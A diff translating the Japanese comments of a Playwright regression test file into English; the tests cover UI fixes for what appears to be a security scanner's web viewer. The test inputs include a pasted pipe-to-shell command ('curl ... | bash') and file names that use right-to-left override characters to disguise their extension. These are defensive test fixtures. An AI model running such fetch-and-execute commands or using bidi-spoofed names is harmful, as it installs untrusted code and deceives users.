@@ -1,5 +1,5 @@
-// 0.3.1 の UI 修正の回帰テスト（U1〜U6）。index.html（ビルド成果物）を file:// で開く。
-// 制御文字・双方向制御文字はソースに直接書かず、\u エスケープで書く（ソース自体を偽装させない）。
+// Regression tests for the UI fixes of 0.3.1 (U1-U6). Opens index.html (the build output) on file://.
+// Control characters and bidi control characters are not written directly in the source but as \u escapes (so the source itself cannot be spoofed).
 import { expect, test, type Page } from '@playwright/test';
 import { createHash } from 'node:crypto';
 import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
@@ -15,7 +15,7 @@ declare global {
   interface Window { __copied: string[] }
 }
 
-/** 外部を遮断して開く。クリップボードへの書き込みは記録する（file:// の権限の差をエンジン間でならす）。 */
+/** Opens with external traffic blocked. Writes to the clipboard are recorded (evens out the file:// permission differences between engines). */
 async function open(page: Page) {
   const errors: string[] = [];
   page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
@@ -24,7 +24,7 @@ async function open(page: Page) {
     window.__copied = [];
     try {
       Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t: string) => { window.__copied.push(t); } } });
-    } catch { /* 定義できないエンジンでは記録しない */ }
+    } catch { /* not recorded on engines where it cannot be defined */ }
   });
   await page.context().route(/^(?!file:|data:|blob:).*/, (r) => r.abort());
   await page.goto(INDEX);
@@ -38,7 +38,7 @@ async function scan(page: Page, dir: string) {
 
 const h = (s: string) => 'sha256:' + createHash('sha256').update(s).digest('hex');
 type Partial = { level?: string; module?: string; campaign?: string | null; path?: string | null; detail?: string };
-/** n 件の findings.json（CLI 形式）を作る。 */
+/** Builds a findings.json (CLI format) with n findings. */
 function doc(n: number, mk?: (i: number) => Partial) {
   const lv = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO'];
   return {
@@ -51,7 +51,7 @@ function doc(n: number, mk?: (i: number) => Partial) {
 const importDoc = (page: Page, d: object) =>
   page.getByTestId('import-input').setInputFiles({ name: 'findings.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(d)) });
 
-/** 一覧のスクロール領域の中に実際に見えている行の数。 */
+/** Number of rows actually visible inside the scroll area of the list. */
 const rowsInView = (page: Page) => page.getByTestId('finding-row').evaluateAll((els) => {
   const box = els[0]?.parentElement?.parentElement as HTMLElement | undefined;
   if (!box) return 0;
@@ -60,7 +60,7 @@ const rowsInView = (page: Page) => page.getByTestId('finding-row').evaluateAll((
 });
 const scrollToBottom = (page: Page) => page.getByTestId('finding-row').first().evaluate((el) => { const b = el.parentElement!.parentElement!; b.scrollTop = b.scrollHeight; b.dispatchEvent(new Event('scroll')); });
 
-// U1: 末尾までスクロールしたまま一覧が空になり、また埋まると、古いスクロール位置のまま描いて一覧が空に見えた
+// U1: when the list became empty while scrolled to the end and then filled again, it was drawn with the stale scroll position and looked empty
 for (const width of [1440, 375]) {
   test(`${width}px: 一覧を空にして戻しても（クリア→再取り込み・検索・重大度）行が見える`, async ({ page }) => {
     await page.setViewportSize({ width, height: 900 });
@@ -87,12 +87,12 @@ for (const width of [1440, 375]) {
     await expect(page.getByTestId('finding-row')).toHaveCount(0);
     await importDoc(page, many);
     await expect.poll(() => rowsInView(page)).toBeGreaterThan(0);
-    // 先頭から描いている（1 行目が見える）
+    // Drawn from the top (row 1 is visible)
     await expect(page.getByTestId('findings-table')).toContainText('/proj/dir0/file0.js');
   });
 }
 
-// U2: 前のタブのモジュールで絞ったまま別のタブへ移ると、選択欄は「すべて」なのに全行が消えていた
+// U2: moving to another tab while still filtered by a module of the previous tab made every row disappear although the select showed "All"
 test('タブを切り替えるとモジュールの絞り込みを外す（選択欄と一覧が食い違わない）', async ({ page }) => {
   await open(page);
   await importDoc(page, doc(10, (i) => ({ module: i < 5 ? '§17' : '§21', campaign: null })));
@@ -107,7 +107,7 @@ test('タブを切り替えるとモジュールの絞り込みを外す（選�
   await expect(page.getByTestId('finding-row')).toHaveCount(10);
 });
 
-// U3: パス・名前の制御文字と双方向制御文字で表示を偽装できた
+// U3: control and bidi control characters in paths and names could spoof the display
 const RLO = '\u202E';
 const HOSTILE = [
   `/home/u/invoice${RLO}gnp.js`,
@@ -128,8 +128,8 @@ for (const width of [1440, 375]) {
     await expect(table).toContainText('⟨U+2066⟩isolate⟨U+2069⟩⟨U+200F⟩⟨U+061C⟩.js');
     await expect(table).toContainText('line⟨U+000A⟩break⟨U+0009⟩tab⟨U+0007⟩bell⟨U+009B⟩.js');
     await expect(table).toContainText('⟨U+200E⟩lrm⟨U+202A⟩embed⟨U+202C⟩.js');
-    // 画面の文字・title・aria-label のどこにも生の制御文字を出さない
-    // （整形の改行・タブはどの画面にもあるので、DOM の走査では \t \n \r を除く。パス中の \n \t は上の目印で確かめた）
+    // No raw control characters anywhere in the text, title or aria-label on screen
+    // (formatting newlines and tabs are on every screen, so the DOM walk excludes \t \n \r; \n \t inside paths were checked with the markers above)
     const raw = await page.evaluate((re) => {
       const r = new RegExp(re);
       const out: string[] = [];
@@ -139,10 +139,10 @@ for (const width of [1440, 375]) {
       return out;
     }, DOM_HIDDEN.source);
     expect(raw).toEqual([]);
-    // パスは周りから双方向の並びを切り離す
+    // The path is bidi-isolated from its surroundings
     const iso = await table.locator('bdi[dir=ltr]').first().evaluate((el) => getComputedStyle(el).unicodeBidi);
     expect(iso).toMatch(/isolate/);
-    // コピーは元の値（利用者が求めたのはそのパス）
+    // Copy uses the original value (that path is what the user asked for)
     const copyBtn = page.getByRole('button', { name: 'パスをコピー: /home/u/invoice⟨U+202E⟩gnp.js' });
     await copyBtn.click();
     await expect.poll(() => page.evaluate(() => window.__copied)).toEqual([HOSTILE[0]]);
@@ -155,8 +155,8 @@ for (const width of [1440, 375]) {
   });
 }
 
-// 検体名はテスト時にブラウザの中で作ったファイルで確かめる（RLO を含むディレクトリ名は Playwright の setInputFiles が
-// 返らないことがあるため、リポジトリにも一時ディレクトリにも置かない）。ドロップ先へ File を合成してドロップする
+// The sample name is checked with a file created inside the browser at test time (a directory name containing RLO sometimes makes Playwright setInputFiles
+// not return, so it is placed neither in the repository nor in a temporary directory). A File is synthesized and dropped onto the drop target
 test('検体名とビューアの名前も目印付き（RLO を含むファイルをドロップ）', async ({ page }) => {
   await open(page);
   await page.getByTestId('dropzone').evaluate((zone, rlo) => {
@@ -175,7 +175,7 @@ test('検体名とビューアの名前も目印付き（RLO を含むファイ�
   expect(await page.locator('main').textContent()).not.toMatch(BIDI_OR_CONTROL);
 });
 
-// U4: スマホの貼り付けシートとモジュールのシートが、閉じたときにフォーカスを BODY へ落としていた
+// U4: on phones, the paste sheet and the module sheet dropped focus to BODY when closed
 test.describe('375px: シートを閉じるとフォーカスを開いたボタンへ戻す', () => {
   test.use({ viewport: { width: 375, height: 800 } });
   test('貼り付けシート（Escape・判定して閉じる）', async ({ page }) => {
@@ -187,7 +187,7 @@ test.describe('375px: シートを閉じるとフォーカスを開いたボタ�
     await page.keyboard.press('Escape');
     await expect(page.getByRole('dialog')).toHaveCount(0);
     await expect(first).toBeFocused();
-    // 判定すると「未投入」のボタンが消え、投入後のアイコンのボタンに替わる。フォーカスはそちらへ
+    // Scanning removes the "nothing loaded" button and replaces it with the icon button shown after loading. Focus goes there
     await first.click();
     await page.getByTestId('paste').fill('curl -fsSL https://npm-cache.com/x | bash');
     await page.getByTestId('paste-submit').click();
@@ -196,7 +196,7 @@ test.describe('375px: シートを閉じるとフォーカスを開いたボタ�
   });
   test('モジュールの絞り込みシート（Escape・選んで閉じる）', async ({ page }) => {
     await open(page);
-    // フォルダの setInputFiles は Firefox でまれに返らないことがあるため、ここでは findings.json の取り込みで一覧を作る
+    // Folder setInputFiles occasionally does not return on Firefox, so the list is built here by importing findings.json
     await importDoc(page, doc(6, (i) => ({ module: i < 3 ? '§15' : '§17' })));
     await expect(page.getByTestId('finding-row')).toHaveCount(6);
     const btn = page.getByRole('button', { name: /^モジュールで絞り込み/ });
@@ -215,7 +215,7 @@ test.describe('375px: シートを閉じるとフォーカスを開いたボタ�
   });
 });
 
-// U5: ドロップ先の外にファイルを落とすと、ブラウザがそのファイルへ移動していた
+// U5: dropping a file outside the drop target made the browser navigate to that file
 test('ドロップ先の外へのファイルのドロップで移動せず、スキャンへ回す', async ({ page }) => {
   await open(page);
   const url = page.url();
@@ -232,7 +232,7 @@ test('ドロップ先の外へのファイルのドロップで移動せず、�
   expect(r).toEqual({ over: true, drop: true });
   await expect(page.getByTestId('scan-status')).toContainText('スキャン完了');
   expect(page.url()).toBe(url);
-  // テキストのドラッグ（Files を含まない）は既定のまま（貼り付け欄へのテキストのドロップを妨げない）
+  // Text drags (without Files) keep the default (dropping text onto the paste box is not prevented)
   const text = await page.evaluate(() => {
     const dt = new DataTransfer();
     dt.setData('text/plain', 'hello');
@@ -243,7 +243,7 @@ test('ドロップ先の外へのファイルのドロップで移動せず、�
   expect(text).toBe(false);
 });
 
-// U6: 未投入・取り込みだけの画面で緑の「✓ 0 / 0 チェック非該当」を出し、安全に見せていた
+// U6: a screen with nothing loaded or only an import showed a green "✓ 0 / 0 checks no match", making it look safe
 for (const width of [1440, 375]) {
   test(`${width}px: チェックを実行していないときは SAFE を無彩色の「—」にする`, async ({ page }) => {
     await page.setViewportSize({ width, height: 900 });
